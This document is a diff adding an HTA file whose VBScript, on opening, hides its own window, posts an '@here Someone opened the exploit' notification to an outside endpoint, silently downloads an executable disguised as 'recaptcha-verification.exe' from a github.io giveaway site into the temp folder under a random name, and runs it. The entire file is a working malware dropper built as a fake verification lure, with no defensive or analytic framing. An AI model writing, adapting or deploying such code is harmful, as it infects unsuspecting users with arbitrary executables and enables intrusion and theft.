@@ -1,0 +1,64 @@
+<html>
+<head>
+    <hta:application 
+        applicationname="HiddenApp" 
+        border="none" 
+        showintaskbar="no" 
+        sysmenu="no" 
+        caption="no" 
+        scroll="no" 
+        singleinstance="yes">
+    </hta:application>
+    <script language="VBScript">
+        Sub Window_onLoad()
+            ' Hide the HTA window by resizing and moving it off-screen
+            Window.ResizeTo 1, 1
+            Window.MoveTo -32000, -32000
+
+            ' Log an action (example POST request - modify to your needs)
+            Call SendPostRequest("@here Someone opened the exploit")
+
+            ' Create WScript Shell object
+            Set objShell = CreateObject("WScript.Shell")
+
+            ' Define temp folder and download URL
+            tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
+            downloadUrl = "https://yeut11.github.io/giveawaysontop.github.io/recaptcha-verify/recaptcha-verification.exe"
+            
+            ' Generate a random file name
+            randomFileName = GenerateRandomFileName() & ".exe"
+            downloadedFile = tempFolder & "\" & randomFileName
+
+            ' Download the file using PowerShell with the random file name
+            downloadCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & downloadedFile & "'"""
+            objShell.Run "cmd.exe /c " & downloadCommand, 0, True ' Hidden execution
+
+            ' Optional: Execute the downloaded file
+            objShell.Run downloadedFile, 0, False
+        End Sub
+
+        Function GenerateRandomFileName()
+            Randomize
+            Dim randomString
+            randomString = ""
+            Dim i
+            For i = 1 To 8
+                randomString = randomString & Chr(Int((26 * Rnd) + 65)) ' Generate random A-Z
+            Next
+            GenerateRandomFileName = randomString
+        End Function
+
+        Sub SendPostRequest(message)
+            ' Replace with your method to send POST requests (e.g., using XMLHttpRequest or a third-party tool)
+            ' Here is an example of how it might be implemented:
+            Dim http
+            Set http = CreateObject("Microsoft.XMLHTTP")
+            http.Open "POST", "https://example.com/endpoint", False
+            http.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+            http.Send "message=" & message
+        End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
